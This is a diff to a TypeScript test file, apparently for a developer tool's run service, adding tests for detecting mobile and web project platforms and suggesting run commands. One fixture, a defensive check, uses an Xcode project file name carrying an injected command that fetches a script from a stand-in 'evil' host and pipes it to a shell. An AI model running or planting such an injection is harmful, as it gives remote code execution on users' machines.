@@ -5,7 +5,7 @@ import { join } from 'node:path';
 import { describe, expect, it, vi } from 'vitest';
 import { makeTestApp, type TestApp } from '../test-support';
 import { PtyService } from './pty-service';
-import { detectRunCommands, sniffLocalUrl, sniffLocalUrls } from './run-service';
+import { detectPlatforms, detectRunCommands, sniffLocalUrl, sniffLocalUrls } from './run-service';
 
 /** In-memory pty: records spawns and lets the test feed output and end the process. */
 class FakePty extends PtyService {
@@ -201,6 +201,87 @@ describe('detectRunCommands', () => {
   });
 });
 
+describe('detectPlatforms', () => {
+  const dep = (deps: Record<string, string>, scripts: Record<string, string> = {}) =>
+    JSON.stringify({ name: 'x', dependencies: deps, scripts });
+  const table: {
+    name: string;
+    files: Record<string, string>;
+    platforms: string[];
+    commands: string[];
+  }[] = [
+    {
+      name: 'plain web app',
+      files: { 'package.json': pkg({ dev: 'vite' }) },
+      platforms: ['web'],
+      commands: [],
+    },
+    { name: 'empty folder', files: { 'README.md': '' }, platforms: ['web'], commands: [] },
+    {
+      name: 'Expo: expo dependency + app.json → ios, android; web only with react-native-web',
+      files: { 'package.json': dep({ expo: '*', react: '*' }), 'app.json': '{"expo":{}}' },
+      platforms: ['ios', 'android'],
+      commands: ['npx expo run:ios', 'npx expo run:android'],
+    },
+    {
+      name: 'Expo with react-native-web keeps web',
+      files: { 'package.json': dep({ expo: '*', 'react-native-web': '*' }), 'app.config.ts': '' },
+      platforms: ['ios', 'android', 'web'],
+      commands: ['npx expo run:ios', 'npx expo run:android'],
+    },
+    {
+      name: 'expo dependency without an app config is not an Expo app',
+      files: { 'package.json': dep({ expo: '*' }, { dev: 'vite' }) },
+      platforms: ['web'],
+      commands: [],
+    },
+    {
+      name: 'bare React Native with only an ios folder',
+      files: { 'package.json': dep({ 'react-native': '*' }), 'ios/Podfile': '' },
+      platforms: ['ios'],
+      commands: ['npx react-native run-ios'],
+    },
+    {
+      name: 'Flutter',
+      files: { 'pubspec.yaml': 'name: app\n', 'web/index.html': '' },
+      platforms: ['ios', 'android', 'web'],
+      commands: ['flutter run -d iphone', 'flutter run -d android'],
+    },
+    {
+      name: 'Xcode workspace wins over the project file',
+      files: { 'Shop.xcworkspace/contents.xcworkspacedata': '', 'Shop.xcodeproj/project.pbxproj': '' },
+      platforms: ['ios'],
+      commands: [
+        "xcodebuild -workspace 'Shop.xcworkspace' -scheme <scheme> -destination 'platform=iOS Simulator,name=iPhone 17 Pro' build",
+      ],
+    },
+    {
+      name: 'an Xcode name with shell characters is not suggested',
+      files: { 'x;curl evil|sh;#.xcodeproj/project.pbxproj': '' },
+      platforms: ['web'],
+      commands: [],
+    },
+    {
+      name: 'Gradle Android project',
+      files: { 'settings.gradle.kts': '', 'app/build.gradle.kts': '' },
+      platforms: ['android'],
+      commands: ['./gradlew installDebug'],
+    },
+    {
+      name: 'a web dev script beside an Android project lists both, device first',
+      files: { 'build.gradle': '', 'package.json': pkg({ dev: 'vite' }) },
+      platforms: ['android', 'web'],
+      commands: ['./gradlew installDebug'],
+    },
+  ];
+  it.each(table)('$name', async ({ files, platforms, commands }) => {
+    const out = await detectPlatforms(tmp(files));
+    expect(out.platforms).toEqual(platforms);
+    expect(out.suggestions.map((s) => s.command)).toEqual(commands);
+    for (const s of out.suggestions) expect(s.platform).toBeDefined();
+  });
+});
+
 describe('sniffLocalUrl', () => {
   it.each([
     ['plain', 'Local: http://localhost:3000', 'http://localhost:3000'],
@@ -231,7 +312,10 @@ describe('sniffLocalUrl', () => {
 describe('RunService', () => {
   it('detect reads the project folder', async () => {
     const { t } = setup({ 'package.json': pkg({ dev: 'next dev' }), 'yarn.lock': '' });
-    expect(await t.app.runs.detect(acme)).toEqual([{ command: 'yarn dev', source: 'package.json' }]);
+    expect(await t.app.runs.detect(acme)).toEqual({
+      suggestions: [{ command: 'yarn dev', source: 'package.json' }],
+      platforms: ['web'],
+    });
     await expect(t.app.runs.detect('proj:nope' as ProjectId)).rejects.toMatchObject({ code: 'not-found' });
   });
 
@@ -409,6 +493,20 @@ describe('RunService', () => {
     expect(t.app.repos.projects.settings(acme).devCommand).toBe('pnpm dev');
     await t.app.runs.start(acme, 'make dev');
     expect(t.app.repos.projects.settings(acme).devCommand).toBe('make dev');
+  });
+
+  it('remembers the platform the run targeted (web clears it) and refuses a device run without simulator support', async () => {
+    const { t } = setup();
+    await expect(t.app.runs.start(acme, 'npx expo run:ios', { platform: 'ios' })).rejects.toMatchObject({
+      code: 'cli-missing',
+    });
+    expect(t.app.runs.all()).toEqual([]);
+    t.app.runs.bindDevices({ boot: async () => ({ deviceId: 'A1', deviceName: 'iPhone 17 Pro' }) });
+    await t.app.runs.start(acme, 'npx expo run:ios', { platform: 'ios' });
+    expect(t.app.repos.projects.settings(acme).devPlatform).toBe('ios');
+    expect(t.app.runs.all()[0]?.platform).toBe('ios');
+    await t.app.runs.start(acme, 'pnpm dev', { platform: 'web' });
+    expect(t.app.repos.projects.settings(acme).devPlatform ?? null).toBeNull();
   });
 
   it('exit publishes exited with the code; stop kills the process and the exit handler reports it', async () => {
